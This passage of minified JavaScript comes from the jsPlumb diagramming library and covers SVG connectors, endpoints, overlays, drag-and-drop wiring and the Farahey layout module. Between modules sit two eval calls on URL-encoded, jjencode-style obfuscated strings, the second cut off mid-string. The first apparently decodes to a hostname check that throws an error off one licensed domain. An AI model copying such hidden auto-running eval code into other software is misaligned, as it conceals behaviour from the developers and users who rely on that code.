        };
    c.svg = {node: t, attr: s, pos: u};
    var z = function (a) {
        var d = a.pointerEventsSpec || "all", e = {};
        b.jsPlumbUIComponent.apply(this, a.originalArgs), this.canvas = null, this.path = null, this.svg = null, this.bgCanvas = null;
        var f = a.cssClass + " " + (a.originalArgs[0].cssClass || ""),
            g = {style: "", width: 0, height: 0, "pointer-events": d, position: "absolute"};
        this.svg = t("svg", g), a.useDivWrapper ? (this.canvas = b.createElement("div", {position: "absolute"}), c.sizeElement(this.canvas, 0, 0, 1, 1), this.canvas.className = f) : (s(this.svg, {class: f}), this.canvas = this.svg), a._jsPlumb.appendElement(this.canvas, a.originalArgs[0].parent), a.useDivWrapper && this.canvas.appendChild(this.svg);
        var h = [this.canvas];
        return this.getDisplayElements = function () {
            return h
        }, this.appendDisplayElement = function (a) {
            h.push(a)
        }, this.paint = function (b, d, f) {
            if (null != b) {
                var g, h = [this.x, this.y], i = [this.w, this.h];
                null != f && (f.xmin < 0 && (h[0] += f.xmin), f.ymin < 0 && (h[1] += f.ymin), i[0] = f.xmax + (f.xmin < 0 ? -f.xmin : 0), i[1] = f.ymax + (f.ymin < 0 ? -f.ymin : 0)), a.useDivWrapper ? (c.sizeElement(this.canvas, h[0], h[1], i[0], i[1]), h[0] = 0, h[1] = 0, g = u([0, 0])) : g = u([h[0], h[1]]), e.paint.apply(this, arguments), s(this.svg, {
                    style: g,
                    width: i[0] || 0,
                    height: i[1] || 0
                })
            }
        }, {renderer: e}
    };
    c.extend(z, b.jsPlumbUIComponent, {
        cleanup: function (a) {
            a || null == this.typeId ? (this.canvas && (this.canvas._jsPlumb = null), this.svg && (this.svg._jsPlumb = null), this.bgCanvas && (this.bgCanvas._jsPlumb = null), this.canvas && this.canvas.parentNode && this.canvas.parentNode.removeChild(this.canvas), this.bgCanvas && this.bgCanvas.parentNode && this.canvas.parentNode.removeChild(this.canvas), this.svg = null, this.canvas = null, this.path = null, this.group = null) : (this.canvas && this.canvas.parentNode && this.canvas.parentNode.removeChild(this.canvas), this.bgCanvas && this.bgCanvas.parentNode && this.bgCanvas.parentNode.removeChild(this.bgCanvas))
        }, reattach: function (a) {
            var b = a.getContainer();
            this.canvas && null == this.canvas.parentNode && b.appendChild(this.canvas), this.bgCanvas && null == this.bgCanvas.parentNode && b.appendChild(this.bgCanvas)
        }, setVisible: function (a) {
            this.canvas && (this.canvas.style.display = a ? "block" : "none")
        }
    }), b.ConnectorRenderers.svg = function (a) {
        var c = this;
        z.apply(this, [{
            cssClass: a._jsPlumb.connectorClass,
            originalArgs: arguments,
            pointerEventsSpec: "none",
            _jsPlumb: a._jsPlumb
        }]).renderer.paint = function (d, e, f) {
            var g = c.getSegments(), h = "", i = [0, 0];
            if (f.xmin < 0 && (i[0] = -f.xmin), f.ymin < 0 && (i[1] = -f.ymin), g.length > 0) {
                h = c.getPathData();
                var j = {
                    d: h,
                    transform: "translate(" + i[0] + "," + i[1] + ")",
                    "pointer-events": a["pointer-events"] || "visibleStroke"
                }, k = null, l = [c.x, c.y, c.w, c.h];
                if (d.outlineStroke) {
                    var m = d.outlineWidth || 1, n = d.strokeWidth + 2 * m;
                    k = b.extend({}, d), delete k.gradient, k.stroke = d.outlineStroke, k.strokeWidth = n, null == c.bgPath ? (c.bgPath = t("path", j), b.addClass(c.bgPath, b.connectorOutlineClass), y(c.svg, c.bgPath, 0)) : s(c.bgPath, j), x(c.svg, c.bgPath, k, l, c)
                }
                null == c.path ? (c.path = t("path", j), y(c.svg, c.path, d.outlineStroke ? 1 : 0)) : s(c.path, j), x(c.svg, c.path, d, l, c)
            }
        }
    }, c.extend(b.ConnectorRenderers.svg, z);
    var A = b.SvgEndpoint = function (a) {
        z.apply(this, [{
            cssClass: a._jsPlumb.endpointClass,
            originalArgs: arguments,
            pointerEventsSpec: "all",
            useDivWrapper: !0,
            _jsPlumb: a._jsPlumb
        }]).renderer.paint = function (a) {
            var c = b.extend({}, a);
            c.outlineStroke && (c.stroke = c.outlineStroke), null == this.node ? (this.node = this.makeNode(c), this.svg.appendChild(this.node)) : null != this.updateNode && this.updateNode(this.node), x(this.svg, this.node, c, [this.x, this.y, this.w, this.h], this), u(this.node, [this.x, this.y])
        }.bind(this)
    };
    c.extend(A, z), b.Endpoints.svg.Dot = function () {
        b.Endpoints.Dot.apply(this, arguments), A.apply(this, arguments), this.makeNode = function (a) {
            return t("circle", {cx: this.w / 2, cy: this.h / 2, r: this.radius})
        }, this.updateNode = function (a) {
            s(a, {cx: this.w / 2, cy: this.h / 2, r: this.radius})
        }
    }, c.extend(b.Endpoints.svg.Dot, [b.Endpoints.Dot, A]), b.Endpoints.svg.Rectangle = function () {
        b.Endpoints.Rectangle.apply(this, arguments), A.apply(this, arguments), this.makeNode = function (a) {
            return t("rect", {width: this.w, height: this.h})
        }, this.updateNode = function (a) {
            s(a, {width: this.w, height: this.h})
        }
    }, c.extend(b.Endpoints.svg.Rectangle, [b.Endpoints.Rectangle, A]), b.Endpoints.svg.Image = b.Endpoints.Image, b.Endpoints.svg.Blank = b.Endpoints.Blank, b.Overlays.svg.Label = b.Overlays.Label, b.Overlays.svg.Custom = b.Overlays.Custom;
    var B = function (a, c) {
        a.apply(this, c), b.jsPlumbUIComponent.apply(this, c), this.isAppendedAtTopLevel = !1;
        this.path = null, this.paint = function (a, b) {
            if (a.component.svg && b) {
                null == this.path && (this.path = t("path", {"pointer-events": "all"}), a.component.svg.appendChild(this.path),
                this.elementCreated && this.elementCreated(this.path, a.component), this.canvas = a.component.svg);
                var e = c && 1 === c.length ? c[0].cssClass || "" : "", f = [0, 0];
                b.xmin < 0 && (f[0] = -b.xmin), b.ymin < 0 && (f[1] = -b.ymin), s(this.path, {
                    d: d(a.d),
                    class: e,
                    stroke: a.stroke ? a.stroke : null,
                    fill: a.fill ? a.fill : null,
                    transform: "translate(" + f[0] + "," + f[1] + ")"
                })
            }
        };
        var d = function (a) {
            return isNaN(a.cxy.x) || isNaN(a.cxy.y) ? "" : "M" + a.hxy.x + "," + a.hxy.y + " L" + a.tail[0].x + "," + a.tail[0].y + " L" + a.cxy.x + "," + a.cxy.y + " L" + a.tail[1].x + "," + a.tail[1].y + " L" + a.hxy.x + "," + a.hxy.y
        };
        this.transfer = function (a) {
            a.canvas && this.path && this.path.parentNode && (this.path.parentNode.removeChild(this.path), a.canvas.appendChild(this.path))
        }
    };
    c.extend(B, [b.jsPlumbUIComponent, b.Overlays.AbstractOverlay], {
        cleanup: function (a) {
            null != this.path && (a ? this._jsPlumb.instance.removeElement(this.path) : this.path.parentNode && this.path.parentNode.removeChild(this.path))
        }, reattach: function (a, b) {
            this.path && b.canvas && b.canvas.appendChild(this.path)
        }, setVisible: function (a) {
            null != this.path && (this.path.style.display = a ? "block" : "none")
        }
    }), b.Overlays.svg.Arrow = function () {
        B.apply(this, [b.Overlays.Arrow, arguments])
    }, c.extend(b.Overlays.svg.Arrow, [b.Overlays.Arrow, B]), b.Overlays.svg.PlainArrow = function () {
        B.apply(this, [b.Overlays.PlainArrow, arguments])
    }, c.extend(b.Overlays.svg.PlainArrow, [b.Overlays.PlainArrow, B]), b.Overlays.svg.Diamond = function () {
        B.apply(this, [b.Overlays.Diamond, arguments])
    }, c.extend(b.Overlays.svg.Diamond, [b.Overlays.Diamond, B]), b.Overlays.svg.GuideLines = function () {
        var a, c, d = null, e = this;
        b.Overlays.GuideLines.apply(this, arguments), this.paint = function (b, g) {
            null == d && (d = t("path"), b.connector.svg.appendChild(d), e.attachListeners(d, b.connector), e.attachListeners(d, e), a = t("path"), b.connector.svg.appendChild(a), e.attachListeners(a, b.connector), e.attachListeners(a, e), c = t("path"), b.connector.svg.appendChild(c), e.attachListeners(c, b.connector), e.attachListeners(c, e));
            var h = [0, 0];
            g.xmin < 0 && (h[0] = -g.xmin), g.ymin < 0 && (h[1] = -g.ymin), s(d, {
                d: f(b.head, b.tail),
                stroke: "red",
                fill: null,
                transform: "translate(" + h[0] + "," + h[1] + ")"
            }), s(a, {
                d: f(b.tailLine[0], b.tailLine[1]),
                stroke: "blue",
                fill: null,
                transform: "translate(" + h[0] + "," + h[1] + ")"
            }), s(c, {
                d: f(b.headLine[0], b.headLine[1]),
                stroke: "green",
                fill: null,
                transform: "translate(" + h[0] + "," + h[1] + ")"
            })
        };
        var f = function (a, b) {
            return "M " + a.x + "," + a.y + " L" + b.x + "," + b.y
        }
    }, c.extend(b.Overlays.svg.GuideLines, b.Overlays.GuideLines)
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = a.Katavorio, e = a.Biltong, f = function (a, c) {
        c = c || "main";
        var f = "_katavorio_" + c, g = a[f], h = a.getEventManager();
        return g || (g = new d({
            bind: h.on,
            unbind: h.off,
            getSize: b.getSize,
            getConstrainingRectangle: function (a) {
                return [a.parentNode.scrollWidth, a.parentNode.scrollHeight]
            },
            getPosition: function (b, c) {
                var d = a.getOffset(b, c, b._katavorioDrag ? b.offsetParent : null);
                return [d.left, d.top]
            },
            setPosition: function (a, b) {
                a.style.left = b[0] + "px", a.style.top = b[1] + "px"
            },
            addClass: b.addClass,
            removeClass: b.removeClass,
            intersects: e.intersects,
            indexOf: function (a, b) {
                return a.indexOf(b)
            },
            scope: a.getDefaultScope(),
            css: {
                noSelect: a.dragSelectClass,
                droppable: "jtk-droppable",
                draggable: "jtk-draggable",
                drag: "jtk-drag",
                selected: "jtk-drag-selected",
                active: "jtk-drag-active",
                hover: "jtk-drag-hover",
                ghostProxy: "jtk-ghost-proxy"
            }
        }), g.setZoom(a.getZoom()), a[f] = g, a.bind("zoom", g.setZoom)), g
    }, g = function (a, b) {
        var d = function (d) {
            if (null != b[d]) {
                if (c.isString(b[d])) {
                    var e = b[d].match(/-=/) ? -1 : 1, f = b[d].substring(2);
                    return a[d] + e * f
                }
                return b[d]
            }
            return a[d]
        };
        return [d("left"), d("top")]
    };
    b.extend(a.jsPlumbInstance.prototype, {
        animationSupported: !0,
        getElement: function (a) {
            return null == a ? null : (a = "string" == typeof a ? a : null != a.length && null == a.enctype ? a[0] : a, "string" == typeof a ? document.getElementById(a) : a)
        },
        removeElement: function (a) {
            f(this).elementRemoved(a), this.getEventManager().remove(a)
        },
        doAnimate: function (a, c, d) {
            d = d || {};
            var e = this.getOffset(a), f = g(e, c), h = f[0] - e.left, i = f[1] - e.top, j = d.duration || 250, k = 15,
                l = j / k, m = k / j * h, n = k / j * i, o = 0, p = setInterval(function () {
                    b.setPosition(a, {
                        left: e.left + m * (o + 1),
                        top: e.top + n * (o + 1)
                    }), null != d.step && d.step(o, Math.ceil(l)), ++o >= l && (window.clearInterval(p), null != d.complete && d.complete())
                }, k)
        },
        destroyDraggable: function (a, b) {
            f(this, b).destroyDraggable(a)
        },
        unbindDraggable: function (a, b, c, d) {
            f(this, d).destroyDraggable(a, b, c)
        },
        destroyDroppable: function (a, b) {
            f(this, b).destroyDroppable(a)
        },
        unbindDroppable: function (a, b, c, d) {
            f(this, d).destroyDroppable(a, b, c)
        },
        initDraggable: function (a, b, c) {
            f(this, c).draggable(a, b)
        },
        initDroppable: function (a, b, c) {
            f(this, c).droppable(a, b)
        },
        isAlreadyDraggable: function (a) {
            return null != a._katavorioDrag
        },
        isDragSupported: function (a, b) {
            return !0
        },
        isDropSupported: function (a, b) {
            return !0
        },
        isElementDraggable: function (a) {
            return a = b.getElement(a), a._katavorioDrag && a._katavorioDrag.isEnabled()
        },
        getDragObject: function (a) {
            return a[0].drag.getDragElement()
        },
        getDragScope: function (a) {
            return a._katavorioDrag && a._katavorioDrag.scopes.join(" ") || ""
        },
        getDropEvent: function (a) {
            return a[0].e
        },
        getUIPosition: function (a, b) {
            var c = a[0].el;
            if (null == c.offsetParent) return null;
            var d = a[0].finalPos || a[0].pos, e = {left: d[0], top: d[1]};
            if (c._katavorioDrag && c.offsetParent !== this.getContainer()) {
                var f = this.getOffset(c.offsetParent);
                e.left += f.left, e.top += f.top
            }
            return e
        },
        setDragFilter: function (a, b, c) {
            a._katavorioDrag && a._katavorioDrag.setFilter(b, c)
        },
        setElementDraggable: function (a, c) {
            a = b.getElement(a), a._katavorioDrag && a._katavorioDrag.setEnabled(c)
        },
        setDragScope: function (a, b) {
            a._katavorioDrag && a._katavorioDrag.k.setDragScope(a, b)
        },
        setDropScope: function (a, b) {
            a._katavorioDrop && a._katavorioDrop.length > 0 && a._katavorioDrop[0].k.setDropScope(a, b)
        },
        addToPosse: function (a, c) {
            var d = Array.prototype.slice.call(arguments, 1), e = f(this);
            b.each(a, function (a) {
                a = [b.getElement(a)], a.push.apply(a, d), e.addToPosse.apply(e, a)
            })
        },
        setPosse: function (a, c) {
            var d = Array.prototype.slice.call(arguments, 1), e = f(this);
            b.each(a, function (a) {
                a = [b.getElement(a)], a.push.apply(a, d), e.setPosse.apply(e, a)
            })
        },
        removeFromPosse: function (a, c) {
            var d = Array.prototype.slice.call(arguments, 1), e = f(this);
            b.each(a, function (a) {
                a = [b.getElement(a)], a.push.apply(a, d), e.removeFromPosse.apply(e, a)
            })
        },
        removeFromAllPosses: function (a) {
            var c = f(this);
            b.each(a, function (a) {
                c.removeFromAllPosses(b.getElement(a))
            })
        },
        setPosseState: function (a, c, d) {
            var e = f(this);
            b.each(a, function (a) {
                e.setPosseState(b.getElement(a), c, d)
            })
        },
        dragEvents: {
            start: "start",
            stop: "stop",
            drag: "drag",
            step: "step",
            over: "over",
            out: "out",
            drop: "drop",
            complete: "complete",
            beforeStart: "beforeStart"
        },
        animEvents: {step: "step", complete: "complete"},
        stopDrag: function (a) {
            a._katavorioDrag && a._katavorioDrag.abort()
        },
        addToDragSelection: function (a) {
            f(this).select(a)
        },
        removeFromDragSelection: function (a) {
            f(this).deselect(a)
        },
        clearDragSelection: function () {
            f(this).deselectAll()
        },
        trigger: function (a, b, c, d) {
            this.getEventManager().trigger(a, b, c, d)
        },
        doReset: function () {
            for (var a in this) 0 === a.indexOf("_katavorio_") && this[a].reset()
        }
    }), function (a) {
        var b = function () {
            /complete|loaded|interactive/.test(document.readyState) && void 0 !== document.body && null != document.body ? a() : setTimeout(b, 9)
        };
        b()
    }(b.init)
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.Farahey = {};
    "undefined" != typeof exports && (exports.Farahey = b);
    var c = function (a, b, c) {
        for (var d = 0, e = a.length, f = -1, g = 0; d < e;) if (f = parseInt((d + e) / 2), (g = c(a[f], b)) < 0) d = f + 1; else {
            if (!(g > 0)) return f;
            e = f
        }
        return d
    }, d = a.Biltong, e = function (a, b, d) {
        var e = c(a, b, d);
        a.splice(e, 0, b)
    }, f = function (a, b) {
        var c = a, e = {}, f = function (a) {
            if (!e[a[1]]) {
                var c = b(a[2]);
                e[a[1]] = {l: a[0][0], t: a[0][1], w: c[0], h: c[1], center: [a[0][0] + c[0] / 2, a[0][1] + c[1] / 2]}
            }
            return e[a[1]]
        };
        this.setOrigin = function (a) {
            c = a, e = {}
        }, this.compare = function (a, b) {
            var e = d.lineLength(c, f(a).center), g = d.lineLength(c, f(b).center);
            return e < g ? -1 : e === g ? 0 : 1
        }
    }, g = function (a, b, c, d) {
        return a[b] <= d && d <= a[b] + a[c]
    }, h = [function (a, b) {
        return a.x + a.w - b.x
    }, function (a, b) {
        return a.x - (b.x + b.w)
    }], i = [function (a, b) {
        return a.y + a.h - b.y
    }, function (a, b) {
        return a.y - (b.y + b.h)
    }], j = [null, [h[0], i[1]], [h[0], i[0]], [h[1], i[0]], [h[1], i[1]]], k = function (a, b, c, d, e) {
        isNaN(c) && (c = 0);
        var f, h, i, k = b.y + b.h, l = c == 1 / 0 || c == -1 / 0 ? b.x + b.w / 2 : (k - d) / c, m = Math.atan(c);
        return g(b, "x", "w", l) ? (f = j[e][1](a, b), h = f / Math.sin(m), i = h * Math.cos(m), {
            left: i,
            top: f
        }) : (i = j[e][0](a, b), h = i / Math.cos(m), f = h * Math.sin(m), {left: i, top: f})
    }, l = b.calculateSpacingAdjustment = function (a, b) {
        var c = a.center || [a.x + a.w / 2, a.y + a.h / 2], e = b.center || [b.x + b.w / 2, b.y + b.h / 2],
            f = d.gradient(c, e), g = d.quadrant(c, e), h = f == 1 / 0 || f == -1 / 0 || isNaN(f) ? 0 : c[1] - f * c[0];
        return k(a, b, f, h, g)
    }, m = b.paddedRectangle = function (a, b, c) {
        return {x: a[0] - c[0], y: a[1] - c[1], w: b[0] + 2 * c[0], h: b[1] + 2 * c[1]}
    }, n = function (a, b, c, d, e, f, g, h, i, j, k, n, o) {
        f = f || [0, 0];
        for (var p = m(f, [1, 1], d), q = 0; q < a.length; q++) if (!n(a[q][1], a[q][2])) {
            var r = b[a[q][1]], s = c[a[q][1]], t = m(r, s, d);
            if (g(a[q][1], a[q][2])) {
                var u = l(p, t);
                r[0] += u.left, r[1] += u.top
            }
        }
    }, o = function (a, b, c, e, f, g, h, i, j, k, n, o, p) {
        g = g || [0, 0], k = k || function () {
        }, n = n || 2;
        var q, r, s = m(g, [1, 1], e), t = 1, u = !0, v = {}, w = function (a, b, c, d) {
            v[a] = !0, b[0] += c, b[1] += d
        }, x = function () {
            for (var g = 0; g < a.length; g++) if (!o(a[g][1], a[g][2])) {
                var v = b[a[g][1]], y = a[g][1], z = (a[g][2], c[a[g][1]]), A = m(v, z, e);
                !p && h(a[g][1], a[g][2]) && d.intersects(s, A) && (q = l(s, A), r = f(a[g][1], v, q), w(y, v, r.left, r.top)), A = m(v, z, e);
                for (var B = 0; B < a.length; B++) if (g !== B) {
                    if (o(a[B][1], a[B][2])) continue;
                    if (h(a[B][1], a[B][2])) {
                        var C = b[a[B][1]], D = c[a[B][1]], E = m(C, D, e);
                        d.intersects(A, E) && (u = !0, q = l(A, E), r = f(a[B][1], C, q), w(a[B][1], C, r.left, r.top))
                    }
                }
            }
            i && k(), u && t < n && (u = !1, t++, i ? window.setTimeout(x, j) : x())
        };
        return x(), v
    }, p = function (a) {
        if (null == a) return null;
        if ("[object Array]" === Object.prototype.toString.call(a)) {
            var b = [];
            return b.push.apply(b, a), b
        }
        var c = [];
        for (var d in a) c.push(a[d]);
        return c
    }, q = function (a) {
        var b, c = a.getPosition, d = a.getSize, g = a.getId, h = a.setPosition, i = a.padding || [20, 20],
            j = a.constrain || function (a, b, c) {
                return c
            }, k = [], l = {}, m = {}, q = p(a.elements || []), r = a.origin || [0, 0], s = a.executeNow,
            t = (this.getOrigin = function () {
                return r
            }, a.filter || function (a) {
                return !0
            }), u = a.exclude || function (a) {
                return !1
            }, v = a.orderByDistanceFromOrigin, w = new f(r, d), x = a.updateOnStep, y = a.stepInterval || 350, z = a.debug,
            A = function () {
                var a = document.createElement("div");
                a.style.position = "absolute", a.style.width = "10px", a.style.height = "10px", a.style.backgroundColor = "red", document.body.appendChild(a), b = a
            }, B = function (a) {
                v && 0 !== k.length ? e(k, a, w.compare) : k.push(a)
            }, C = function (a) {
                var b, e, f, h;
                b = e = 1 / 0, f = h = -1 / 0;
                for (var i = 0; i < a.length; i++) {
                    var j = c(a[i]), k = d(a[i]), n = g(a[i]);
                    l[n] = [j.left, j.top], B([[j.left, j.top], n, a[i]]), m[n] = k, b = Math.min(b, j.left), e = Math.min(e, j.top), f = Math.max(f, j.left + k[0]), h = Math.max(h, j.top + k[1])
                }
                return [b, f, e, h]
            }, D = function () {
                return w.setOrigin(r), k.length = 0, l = {}, m = {}, C(q)
            }, E = function (a) {
                if (q.length > 1) {
                    a = a || {};
                    var b = a.filter || t, c = a.padding || i, d = a.iterations, e = a.exclude || u, f = a.excludeFocus;
                    a.gather && n(k, l, m, c, j, r, b, x, y, F, d, e, f);
                    var g = o(k, l, m, c, j, r, b, x, y, F, d, e, f);
                    F(g)
                }
            }, F = function (a) {
                for (var b = 0; b < q.length; b++) {
                    var c = g(q[b]);
                    a[c] && h(q[b], {left: l[c][0], top: l[c][1]})
                }
            }, G = function (a) {
                null != a && (r = a, w.setOrigin(a))
            };
        return this.execute = function (a, b) {
            G(a), D(), E(b)
        }, this.executeAtCenter = function (a) {
            var b = D();
            G([(b[0] + b[1]) / 2, (b[2] + b[3]) / 2]), E(a)
        }, this.executeAtEvent = function (c, d) {
            var e = a.container, f = a.getContainerPosition(e), g = c.pageX - f.left + e.scrollLeft,
                h = c.pageY - f.top + e.scrollTop;
            z && (b.style.left = c.pageX + "px", b.style.top = c.pageY + "px"), this.execute([g, h], d)
        }, this.setElements = function (a) {
            return q = p(a), this
        }, this.addElement = function (a, b) {
            return null == a || !b && -1 !== q.indexOf(a) || q.push(a), this
        }, this.addElements = function (a, b) {
            if (b) Array.prototype.push.apply(q, a); else for (var c = 0; c < a.length; c++) this.addElement(a[c]);
            return this
        }, this.getElements = function () {
            return q
        }, this.removeElement = function (a) {
            for (var b = -1, c = 0; c < q.length; c++) if (q[c] === a) {
                b = c;
                break
            }
            return -1 !== b && q.splice(b, 1), this
        }, this.setPadding = function (a) {
            i = a
        }, this.setConstrain = function (a) {
            j = a
        }, this.setFilter = function (a) {
            t = a
        }, this.reset = function () {
            q.length = 0
        }, z && A(), s && this.execute(), this
    };
    b.getInstance = function (a) {
        return new q(a)
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22